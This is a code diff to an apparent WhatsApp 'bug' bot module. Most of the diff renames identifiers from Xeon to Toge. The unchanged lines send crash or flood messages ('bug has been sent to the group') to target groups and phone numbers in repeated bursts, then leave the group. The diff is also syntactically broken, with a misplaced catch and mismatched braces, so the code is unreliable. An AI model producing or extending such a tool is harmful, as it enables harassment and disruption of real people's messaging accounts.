@@ -149,7 +149,7 @@ break;
       sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
       replygcxeon("𝐃𝐎𝐍𝐄✅ 𝐁𝐔𝐆 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐄𝐍𝐓 𝐓𝐎 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏!.");
-      XeonBotInc.groupLeave(groupTarget);
+      TogeBotInc.groupLeave(groupTarget);
     }; catch (error) {
       replygctoge(util.format(error));
     };
@@ -171,7 +171,7 @@ break;
   };
   let cleanedNumber = number.replace(/[^0-9]/g, '');
   let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
+  var contactInfo = await TogeBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
   if (cleanedNumber == "24105114159") {
     return;
@@ -214,7 +214,7 @@ break;
   if (contactInfo.length == 0) {
     return replygctoge("The number is not registered on WhatsApp");
   };
-  replygcxeon("please wait, " + command + " bug is in process..");
+  replygctoge("please wait, " + command + " bug is in process..");
   await sleep(2000); // Adjusted sleep time for clarity
   sendRepeatedMessages2(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
@@ -226,13 +226,12 @@ break;
 };
 break;
 case 'clearall': {
-if (!isCreator) return replygctoge(mess.owner)
+if (!isCreator) return replygctoge("*📛 THIS IS AN OWNER COMMAND*")
 TogeBotInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat);
 }
 break
 case 'clearchat':
 togeimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n');
 break
-}
-};
+});
 export default bugCommand;
